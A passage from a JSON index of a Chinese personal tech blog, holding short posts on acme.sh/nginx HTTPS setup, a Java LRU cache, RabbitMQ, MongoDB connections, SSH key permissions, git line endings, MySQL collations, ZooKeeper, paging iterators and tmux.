安装证书接下来将我们的证书安装到nginx（当然也可以是tomcat），下面的脚本除了安装之外，也添加了一个自动更新的任务（一般来说，60 天以后会自动更新，并会强制重启nginx使新的证书生效，可以通过 crontab -e看到对应的定时任务） 1./acme.sh --installcert -d 'hhui.top' -d '*.hhui.top' --key-file /etc/nginx/ssl/key.pem --fullchain-file /etc/nginx/ssl/cert.pem --reloadcmd \"service nginx force-reload\" 6. nginx配置然后就是配置nginx，支持https 下面是一个基础的nginx配置实例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849server { server_name blog.hhui.top; root /home/yihui/xxx; index index.html; gzip on; gzip_buffers 32 4K; gzip_comp_level 6; gzip_min_length 100; gzip_types application/javascript text/css text/xml; gzip_disable &quot;MSIE [1-6]\\.&quot;; #配置禁用gzip条件，支持正则。此处表示ie6及以下不启用gzip（因为ie低版本不支持） gzip_vary on; location ~* ^.+\\.(ico|gif|jpg|jpeg|png)$ { access_log off; expires 1d; } location ~* ^.+\\.(css|js|txt|xml|swf|wav|pptx)$ { access_log off; expires 10m; } location / { try_files $uri $uri/ @router; } location @router { rewrite ^.*$ /index.html last; } listen 443 ssl; ssl_certificate /etc/nginx/ssl/cert.pem; ssl_certificate_key /etc/nginx/ssl/key.pem; ssl_stapling on; ssl_stapling_verify on; resolver 8.8.8.8 8.8.4.4 1.1.1.1 valid=60s; resolver_timeout 2s;}server { if ($host = blog.hhui.top) { return 301 https://$host$request_uri; } listen 80; server_name blog.hhui.top; return 404;} 7. 手动续期手动续期，强制执行，命令如下 1./acme.sh --issue --dns dns_ali -d 'hhui.top' -d '*.hhui.top' --force 执行完毕之后，会输出几个证书，我们需要的是 fullchain.cer 与 hhui.top.key 安装证书并重启 1234cp ~/.acme.sh/hhui.top/hhui.top.key /etc/nginx/ssl/key.pemcp ~/.acme.sh/hhui.top/fullchain.cer /etc/nginx/ssl/cert.pemnginx -s reload 然后浏览器访问目标网站，查看证书判断是否ok II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/08/10/200810-acme-sh-快速实现https证书颁发与自动续期/"},{"title":"201021-LRU算法急速实现版","text":"借助LinkedHashMap飞速实现一个LRU算法的缓存 1234567891011121314151617181920212223242526272829303132import java.util.LinkedHashMap;import java.util.Map;/** * 基于LinkedHashMap实现的LRU算法 * Created by @author yihui in 17:36 20/10/19. */public class LruCache&lt;K, V&gt; extends LinkedHashMap&lt;K, V&gt; { private int size; public LruCache(int size) { super(size, 0.75f, true); this.size = size; } @Override protected boolean removeEldestEntry(Map.Entry&lt;K, V&gt; eldest) { // 当元素个数，超过指定的大小时，淘汰最老的数据 return size() &gt; size; } public static void main(String[] args) { LruCache&lt;String, Integer&gt; cache = new LruCache&lt;&gt;(4); for (int i = 0; i &lt; 6; i++) { cache.put(\"key_\" + i, i); System.out.println(cache); } System.out.println(cache.size); }} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/10/21/201021-LRU算法急速实现版/"},{"title":"201016-rabbitmq延时插件安装","text":"源码: https://github.com/rabbitmq/rabbitmq-delayed-message-exchange 下载二进制的插件，如3.8.0下载地址: https://github.com/rabbitmq/rabbitmq-delayed-message-exchange/releases/tag/v3.8.0 将下载的ez包，放在插件目录下，一般centos的查检目录放在/usr/lib/rabbitmq/lib/rabbitmq_server-xxx/plugins 如果不知道具体在什么地方，可以通过进程查看 拷贝完毕之后，启用插件 1rabbitmq-plugins enable rabbitmq_delayed_message_exchange 接着重启一下rabbit 1service rabbit-server restart 再控制台中，查看是否安装成功 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/10/16/201016-rabbitmq延时插件安装/"},{"title":"201112-Shell 文件迭代遍历","text":"文件迭代遍历，如下 1234567891011121314function read_file() { for file in `ls -a $1` do if [ -d $1\"/\"$file ];then if [[ $file != '.' &amp;&amp; $file != '..' ]];then read_file $1\"/\"$file fi else echo $1\"/\"$file up_file_name=$1\"/\"$file echo $up_file_name fi done} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/11/12/201112-Shell-文件迭代遍历/"},{"title":"200322-MongoDb系列教程二：连接","text":"后续的所有文章的基础，都是需要先连上mongodb，然后才能执行各种命令操作； 本文将介绍一下如何连接一个已经启动的mongodb服务器 1. 连接语法标准URI连接语法： 1mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]] mongodb:// 固定前缀 username:password@: 如果开启了用户登录验证，需要指定用户名密码 host1:port1: mongodb服务器的ip/域名 + 端口(不填时，默认为27017) database: 如果指定username:password@，连接并验证登陆指定数据库。若不指定，默认打开 test 数据库 ?options: 是连接选项。如果不使用/database，则前面需要加上 2. 实例直接连接方式如下，注意这种方式会保留用户名和密码，会有一定的安全风险 连接目标服务器 12# 连接本地mongodbmongo mongodb://root:root@127.0.0.1:27017/admin 连接多台服务器 1mongo mongodb://root:root@127.0.0.1:27017,127.0.0.1:27018/admin 连接 replica set 三台服务器, 写入操作应用在主服务器 并且分布查询到从服务器 1mongo mongodb://host1,host2,host3/?slaveOk=true II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/22/200322-MongoDb系列教程二-连接/"},{"title":"210105-Permissions for .ssh/id_rsa are too open","text":"ssh私钥权限问题，导致登录服务器时，提示异常 1234567@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0750 for '/Users/user/.ssh/id_rsa' are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key \"/Users/user/.ssh/id_rsa\": bad permissions 解决这个问题的一个手段是将它的权限设置为700 1chmod -R 700 .ssh/ II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/01/05/210105-Permissions-for-ssh-id-rsa-are-too-open/"},{"title":"210104-IDEA resin配置","text":"Resin是CAUCHO公司（http://www.caucho.com/）的产品，是一个非常流行的支持servlets 和jsp的引擎，速度非常快。Resin本身包含了一个支持HTTP/1.1的WEB服务器。虽然它可以显示动态内容，但是它显示静态内容的能力也非常强，速度直逼APACHE SERVER 简单把resin理解为一个类似tomcat的web服务器就好，下面介绍一下IDEA如何配置resin，从而快速启动 1. 插件安装进入idea的设置，找到plugins, 选中 Marketplace，输入resin，选择下面这个插件安装，注意安装完毕之后需要重启idea 2. resin下载直接到官网下载(https://caucho.com/)，本地解压 请记住这个地址 3. 启动配置首先需要添加一个启动配置项 点击+号，查找Resin -&gt; Local 首次配置时，需要指定本地安装的resin服务目录 项目的端口号根据实际进行填写 Server配置完毕之后，选中Deployment 点击下面的+ 在弹窗中，选择后缀为 exploded 的，点击确认 配置完毕之后，启动选项中，会有一个配置项，选中之后启动即可 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/01/04/210104-IDEA-resin配置/"},{"title":"210121-StringUtils字符串分割使用姿势异常记录","text":"字符串分割，属于比较常见的case了，在实际开发中，相信很多小伙伴会借助common-lang工具包中的StringUtils来实现，使用姿势也很简单 1String[] ans = StringUtils.split(\"a,b,c\", \",\"); 一般来讲上面这种使用方式没有问题，但是当分隔符前后为空时，需要特别注意，可能会和你预期的返回不一致 实例演示，xml依赖如下 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt; &lt;version&gt;3.9&lt;/version&gt;&lt;/dependency&gt; 一个实例代码如下 12345public static void main(String[] args) { String ans = \"a:b:\"; String[] values = StringUtils.split(ans, \":\"); System.out.println(JSONObject.toJSONString(values));} 输出结果如 1[&quot;a&quot;,&quot;b&quot;] 请注意，最后一个空白字符被忽略掉了，假设我们的字符串格式是固定的 形如：name:age:addr 当我们拿到一个字符串希望解析上面三个数据时，可能就会出现数组越界问题 特别是当字符串为 :10:时，解析之后的数组长度只是1，这个时候可能就会有问题了 当出现上面这个场景时，可以借助StringUtils.splitByWholeSeparatorPreserveAllTokens 实测case如下 123456789public static void main(String[] args) { String ans = \":10:\"; String[] values = StringUtils.split(ans, \":\"); System.out.println(JSONObject.toJSONString(values)); values = StringUtils.splitByWholeSeparatorPreserveAllTokens(ans, \":\"); System.out.println(JSONObject.toJSONString(values));} 输出结果 12[&quot;10&quot;][&quot;&quot;,&quot;10&quot;,&quot;&quot;] 小结 StringUtils#split: 会忽略长度为0的字符串 splitByWholeSeparatorPreserveAllTokens: 会保留所有的字符串 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/01/21/210121-StringUtils字符串分割使用姿势异常记录/"},{"title":"210123-Quick-Media 前置渲染模板支持","text":"Java端”最强”二维码渲染工具又双叒叕升级了，新增前置模板渲染，简单几行代码即可实现酷炫的二维码生成 项目源码：https://github.com/liuyueyi/quick-media 首先理解一下前置渲染模板和背景图的实现区别，对于背景图而言，可以简单的理解为是将二维码放在背景图上一层，因此我们可以实现给二维码添加底色，背景样式等；而前置渲染模板则是将二维码放在下层，可以在上面再套一层图片 因此当我希望给二维码添加一些装饰时，使用前置渲染模板就是更好的选择了，如下图 I. 使用说明 更多详细用法推荐查看: Quick-Media二维码使用手册: https://liuyueyi.github.io/quick-media 添加pom依赖 123456&lt;!-- https://mvnrepository.com/artifact/com.github.liuyueyi.media/qrcode-plugin --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.liuyueyi.media&lt;/groupId&gt; &lt;artifactId&gt;qrcode-plugin&lt;/artifactId&gt; &lt;version&gt;2.5.3&lt;/version&gt;&lt;/dependency&gt; 第二步准备素材，我们现在以https://cdn.pixabay.com/photo/2017/06/14/12/58/heart-2402086_960_720.png 为前置图，生成一个爱心的二维码 使用姿势如下 12345678910String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\"; int size = 500;QrCodeGenWrapper.of(msg) .setW(size) .setH(size) .setDrawPreColor(Color.RED) .setFtImg(\"https://cdn.pixabay.com/photo/2017/06/14/12/58/heart-2402086_960_720.png\") .setFtStartX(110) .setFtStartY(120) .asFile(\"/tmp/imgQr3.png\"); 生成二维码效果如下 除了上面的case之外，我们还可以针对二维码本身进行一些定制化，如使用我自己的素材来替换二维码的小方块 123456789101112131415String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\";int size = 500;boolean ans = QrCodeGenWrapper.of(msg) .setW(size) .setH(size) .setDrawBgColor(ColorUtil.OPACITY) .setDetectImg(\"love/01.png\") .setDrawStyle(QrCodeOptions.DrawStyle.IMAGE) .addImg(1, 1, \"love/003_01.png\") .addImg(4, 1, \"love/004.png\") .addImg(1, 4, \"love/004_02.png\") .setFtImg(\"https://cdn.pixabay.com/photo/2017/06/14/12/58/heart-2402086_960_720.png\") .setFtStartX(110) .setFtStartY(120) .asFile(\"/tmp/imgQr2.png\"); 难道号称Java界最强的二维码渲染工具，就仅止与此么？ 当然不，接下来让我们的二维码动起来，选择一个gif的前置渲染图，借助搜索工具，从 http://daimadaquan.blog.sohu.com/134743858.html 选择一张动图测试一下 12345678910111213141516171819202122@Testpublic void testPreGif() { String pre = \"http://1832.img.pp.sohu.com.cn/images/blog/2009/10/23/20/24/12530644e76g215.jpg\"; try { // 二维码 int qrSize = 240; String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\"; QrCodeGenWrapper.of(msg) .setW(qrSize) .setH(qrSize) .setDrawPreColor(0xff73a7f5) .setDrawEnableScale(true) .setFtImg(pre) .setFtStartX(95) .setFtStartY(0) .setFtFillColor(Color.WHITE) .asFile(\"/tmp/ft_0.gif\"); } catch (Exception e) { e.printStackTrace(); }} 使用气泡生成的动图 使用脚丫子生成的动图 再比如加一个动态的logo 当然由于没有设计大佬支持，以上的图从网上找的资源合成，所以美观上很有不足，以上主要是为了演示Quick-Media能支撑的力度 欢迎设计大佬友情提供更多模板 欢迎有兴趣的开发大佬使用尝鲜，源码地址，觉得不错的请☆ https://github.com/liuyueyi/quick-media II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/01/23/210123-Quick-Media-前置渲染模板支持/"},{"title":"210128-dubbo接口测试小技巧","text":"记录一下借助telnate进行简单的dubbo接口测试 获取dubbo端口号 telnate ip port ls 列出所有服务 invoke com.xxx.Service.sayHello(&quot;xxx&quot;) 如果传参的是Object对象，传Json串，并添加一个class来指定具体的类型 此外，idea可以通过搜索插件安装DubboInvoker，然后在对外暴露的接口右键，在菜单中选择DubboInvoker即可快速的测试使用了 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/01/28/210128-dubbo接口测试小技巧/"},{"title":"210107-Spring工具类之基本元素判断","text":"实际业务开发中偶尔会遇到判断一个对象是否为基本数据类型，除了我们自老老实实的自己写之外，也可以借助Spring的 BeanUtils 工具类来实现 12345// Java基本数据类型及包装类型判断org.springframework.util.ClassUtils#isPrimitiveOrWrapper// 扩展的基本类型判断org.springframework.beans.BeanUtils#isSimpleProperty 这两个工具类的实现都比较清晰，源码看一下，可能比我们自己实现要优雅很多 基本类型判定：ClassUtils 1234public static boolean isPrimitiveOrWrapper(Class&lt;?&gt; clazz) { Assert.notNull(clazz, \"Class must not be null\"); return (clazz.isPrimitive() || isPrimitiveWrapper(clazz));} 注意：非包装类型，直接使用class.isPrimitive() 原生的jdk方法即可 包装类型，则实现使用Map来初始化判定 1234567891011121314151617181920private static final Map&lt;Class&lt;?&gt;, Class&lt;?&gt;&gt; primitiveWrapperTypeMap = new IdentityHashMap&lt;&gt;(8);static { primitiveWrapperTypeMap.put(Boolean.class, boolean.class); primitiveWrapperTypeMap.put(Byte.class, byte.class); primitiveWrapperTypeMap.put(Character.class, char.class); primitiveWrapperTypeMap.put(Double.class, double.class); primitiveWrapperTypeMap.put(Float.class, float.class); primitiveWrapperTypeMap.put(Integer.class, int.class); primitiveWrapperTypeMap.put(Long.class, long.class); primitiveWrapperTypeMap.put(Short.class, short.class); primitiveWrapperTypeMap.put(Void.class, void.class);}public static boolean isPrimitiveWrapper(Class&lt;?&gt; clazz) { Assert.notNull(clazz, \"Class must not be null\"); return primitiveWrapperTypeMap.containsKey(clazz);} 这里非常有意思的一个点是这个Map容器选择了IdentityHashMap，这个又是什么东西呢？ 下篇博文仔细撸一下它 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/01/07/210107-Spring工具类之基本元素判断/"},{"title":"210129-Java对象内存地址输出","text":"当一个对象没有重写hascode方法时，它返回的内存地址，当覆盖之后，我们有什么办法获取对象的内存地址么? 使用 System.identityHashCode() 输出内存地址 123456789101112131415public static void main(String[] args) { BaseDo base = new BaseDo(); base.name = \"hello\"; int addr = System.identityHashCode(base); System.out.println(base.hashCode() + \"|\" + addr);}public static class BaseDo { String name; @Override public int hashCode() { return super.hashCode(); }} 输出结果如: 1997608398|997608398 这个有啥用？ 判断两个对象是否为同一个对象时，可以借用（我是在验证Mybatis的一级缓存的，判断返回的Entity是否确实是同一个的时候以此来判定的） II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/01/29/210129-Java对象内存地址输出/"},{"title":"210208-git diff ^M不同操作系统下换行区别","text":"不同操作系统下的换行不一致，当一个项目的开发者分别再linux/mac/win下做了代码提交改动之后，使用git diff命令时，可能会发现，即便啥也没改，当时有很多变动，显示^M的差别 主要原因就是换行的问题 解决这个问题的一个办法就是统一换行 1git config --global core.autocrlf true 因为Linux和Mac都是使用LF ，Windows 则是CRLF，所以在我们按下回车换行时，虽然肉眼的展示效果一致，当时实际上却是不一样的 windows: CRLF = \\r\\n mac/linux: lf = \\n GitHub建议你应该只用\\n来做为新行的开始，当然建议只是建议；一个原则就是我们希望可以统一，一分代码，不管在什么操作系统下，表现一致（包括换行、编码等） 使用core.autocrlf参数，设置为ture时，Git可以在你提交时自动地把行结束符CRLF转换成LF，而在签出代码时把LF转换成CRLF Linux或Mac系统使用LF作为行结束符，因此你不想Git在签出文件时进行自动的转换；当一个以CRLF为行结束符的文件不小心被引入时你肯定想进行修正， 把core.autocrlf设置成input来告诉Git在提交时把CRLF转换成LF，签出时不转换 1git config --global core.autocrlf input II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/02/08/210208-git-diff-M不同操作系统下换行区别/"},{"title":"201125-Mysql 字符集不一致问题","text":"做一个简单的如下的连表查询，居然直接提示错误，居然是字符集不一致的问题，本文记录一下mysql的字符集类型，以及下面这个问题的解决方案 123select a.id, b.id from tt as a, t2 as b where a.xx = b.xx-- Illegal mix of collations (utf8mb4_unicode_ci,IMPLICIT) and (utf8mb4_general_ci,IMPLICIT) for operation '=' 1. 解决方法先来看上面这个问题的解决方法，最容易想到的就是统一两张表的字符集，要么都是utf8mb4_general_ci，要么就都是utf8mb4_unicode_ci，统一一下这个问题就自然解决了 如果我不想修改表的字符集呢？毕竟生产环境下，做这种操作还是有风险的，下面是一种不太优雅的解决方法 在字段后面指定字符集（可以全部都指定为utf8mb4_general_ci 当然也可以全部指定为 utf8mb4_unicode_ci， 根据实际需要进行处理即可） 1select a.id, b.id from tt as a, t2 as b where a.xx = b.xx collate utf8mb4_general_ci 2. mysql字符集字符集 对于国内的小伙伴，一般而言我们常见的字符集有下面三种 gbk: 两字节 utf8: 三个字节 utf8mb4: 四个字节 而mysql实际支持的就比较多了，可以通过show charset;进行查询 校验规则 在实际的case中，经常会看到下面几种 utf8_bin utf8mb4_unicode_ci utf8mb4_general_ci latin1_general_cs 当然我们也可以通过 show collation;查看所支持的校验规则 请注意上面的写法 ci: case insensitive的缩写 大小写不敏感 cs: case sensitive 大小写敏感 bin: 二进制存储，大小写敏感 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/11/25/201125-Mysql-字符集不一致问题/"},{"title":"210310-ZooKeeper安装及初体验","text":"ZooKeeper安装以及基本功能体验 1. 安装下载地址: https://zookeeper.apache.org/releases.html 选择bin下载，避免本地编译，如选择最新的3.6.2版 https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.2/apache-zookeeper-3.6.2-bin.tar.gz 下载完毕之后，解压放在目标位置 1tar -xvf apache-zookeeper-3.6.2-bin.tar.gz 启动之前请确保jdk8以上的环境 启动命令 12# 前台使用默认配置启动bin/zkServer.sh start-foreground 2. 初体验借助 bin/zkCli.sh 连接查看 12345678910111213141516171819# 资源列表ls path # 列出路径下的资源# 创建节点# -e 表示临时， 不带表示持久节点# -s 表示顺序节点# path 路径# data 携带的数据信息create [-e] [-s] path data # 查看节点数据get path# 设置数据set path data [version]# 删除节点delete path [version] 实例演示 123456789101112131415161718192021222324252627[zk: localhost:2181(CONNECTED) 28] create /hello &apos;一灰&apos;Created /hello[zk: localhost:2181(CONNECTED) 29] get /hello一灰[zk: localhost:2181(CONNECTED) 30] create /hello/01 &apos;00&apos;Created /hello/01[zk: localhost:2181(CONNECTED) 31] create /hello/02 &apos;02&apos;Created /hello/02[zk: localhost:2181(CONNECTED) 32] ls /hello[01, 02][zk: localhost:2181(CONNECTED) 33] get /hello/0100[zk: localhost:2181(CONNECTED) 34] delete /helloNode not empty: /hello[zk: localhost:2181(CONNECTED) 35] delete /hello/01[zk: localhost:2181(CONNECTED) 36] ls /hello[02][zk: localhost:2181(CONNECTED) 39] create -e -s /hello/02 &apos;有序&apos;Created /hello/020000000002[zk: localhost:2181(CONNECTED) 40] get /hello/0202[zk: localhost:2181(CONNECTED) 41] get /hello/020000000002有序[zk: localhost:2181(CONNECTED) 42] create -e -s /hello/03 &apos;有序&apos;Created /hello/030000000003[zk: localhost:2181(CONNECTED) 43] ls /hello[02, 020000000002, 030000000003] 3. 基本概念四种节点: 持久化节点PERSISTENT: 节点创建之后，一直存在，除非手动删除 持久化顺序节点PERSISTENT_SEQUENTIAL: 持久化节点，与上面的区别在于它的顺序性，zk中，每个父节点会为第一级子节点维护时序，记录子节点创建的先后顺序，这里的有序可以理解为在节点名上添加一个有序的数字后缀，作为新的节点名 临时节点EPHEMERAL: 与持久节点的区别在于临时节点的生命周期与client绑定，当client终端，这个节点会被销毁 临时有序节点EPHEMERAL_SEQUENTIAL: 临时节点，有序，zk的分布式锁一般是采用它来实现 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/03/10/210310-ZooKeeper安装及初体验/"},{"title":"210225-分页遍历的两种使用姿势","text":"在日常开发中，分页遍历迭代的场景可以说非常普遍了，比如扫表，每次捞100条数据，然后遍历这100条数据，依次执行某个业务逻辑；这100条执行完毕之后，再加载下一百条数据，直到扫描完毕 那么要实现上面这种分页迭代遍历的场景，我们可以怎么做呢 本文将介绍两种使用姿势 常规的使用方法 借助Iterator的使用姿势 1. 数据查询模拟首先mock一个分页获取数据的逻辑，直接随机生成数据，并且控制最多返回三页 123456789101112131415161718public static int cnt = 0;private static List&lt;String&gt; randStr(int start, int size) { ++cnt; if (cnt &gt; 3) { return Collections.emptyList(); } else if (cnt == 3) { cnt = 0; size -= 2; } System.out.println(\"======================= start to gen randList ====================\"); List&lt;String&gt; ans = new ArrayList&lt;&gt;(size); for (int i = 0; i &lt; size; i++) { ans.add((start + i) + \"_\" + UUID.randomUUID().toString()); } return ans;} 2. 基本实现方式针对这种场景，最常见也是最简单直观的实现方式 while死循环 内部遍历 123456789101112131415private static void scanByNormal() { int start = 0; int size = 5; while (true) { List&lt;String&gt; list = randStr(start, size); for (String str : list) { System.out.println(str); } if (list.size() &lt; size) { break; } start += list.size(); }} 3. 迭代器实现方式接下来介绍一种更有意思的方式，借助迭代器的遍历特性来实现，首先自定义一个通用分页迭代器 123456789101112131415161718192021222324252627282930313233343536373839404142434445public static abstract class MyIterator&lt;T&gt; implements Iterator&lt;T&gt; { private int start = 0; private int size = 5; private int currentIndex; private boolean hasMore = true; private List&lt;T&gt; list; public MyIterator() { } @Override public boolean hasNext() { if (list != null &amp;&amp; list.size() &gt; currentIndex) { return true; } // 当前的数据已经加载完毕，尝试加载下一批 if (!hasMore) { return false; } list = load(start, size); if (list == null || list.isEmpty()) { // 没有加载到数据，结束 return false; } if (list.size() &lt; size) { // 返回条数小于限制条数，表示还有更多的数据可以加载 hasMore = false; } currentIndex = 0; start += list.size(); return true; } @Override public T next() { return list.get(currentIndex++); } public abstract List&lt;T&gt; load(int start, int size);} 接下来借助上面的迭代器可以比较简单的实现我们的需求了 12345678910111213private static void scanByIterator() { MyIterator&lt;String&gt; iterator = new MyIterator&lt;String&gt;() { @Override public List&lt;String&gt; load(int start, int size) { return randStr(start, size); } }; while (iterator.hasNext()) { String str = iterator.next(); System.out.println(str); }} 那么问题来了，上面这种使用方式比前面的优势体现再哪儿呢？ 双层循环改为单层循环 接下来接入重点了，在jdk1.8引入了函数方法 + lambda之后，又提供了一个更简洁的使用姿势 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public class IteratorTestForJdk18 { @FunctionalInterface public interface LoadFunc&lt;T&gt; { List&lt;T&gt; load(int start, int size); } public static class MyIterator&lt;T&gt; implements Iterator&lt;T&gt; { private int start = 0; private int size = 5; private int currentIndex; private boolean hasMore = true; private List&lt;T&gt; list; private LoadFunc&lt;T&gt; loadFunc; public MyIterator(LoadFunc&lt;T&gt; loadFunc) { this.loadFunc = loadFunc; } @Override public boolean hasNext() { if (list != null &amp;&amp; list.size() &gt; currentIndex) { return true; } // 当前的数据已经加载完毕，尝试加载下一批 if (!hasMore) { return false; } list = loadFunc.load(start, size); if (list == null || list.isEmpty()) { // 没有加载到数据，结束 return false; } if (list.size() &lt; size) { // 返回条数小于限制条数，表示还有更多的数据可以加载 hasMore = false; } currentIndex = 0; start += list.size(); return true; } @Override public T next() { return list.get(currentIndex++); } }} 在jdk1.8及之后的使用姿势，一行代码即可 1234private static void scanByIteratorInJdk8() { new MyIterator&lt;&gt;(IteratorTestForJdk18::randStr) .forEachRemaining(System.out::println);} 这次对比效果是不是非常显眼了，从此以后分页迭代遍历再也不用冗长的双重迭代了 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/02/25/210225-分页遍历的两种使用姿势/"},{"title":"210203-tmux 批量操作","text":"借助tmux，可以非常方便的实现同时操作多个面板 123456789101112# 启用tmux# 开面板，上下、左右ctrl + b: %ctrl + b: \"# 开启批量操作ctrl + b -&gt; :set synchronize-panes on# 关闭面板ctrl + b: x 实例演示如下 II. 其他1. 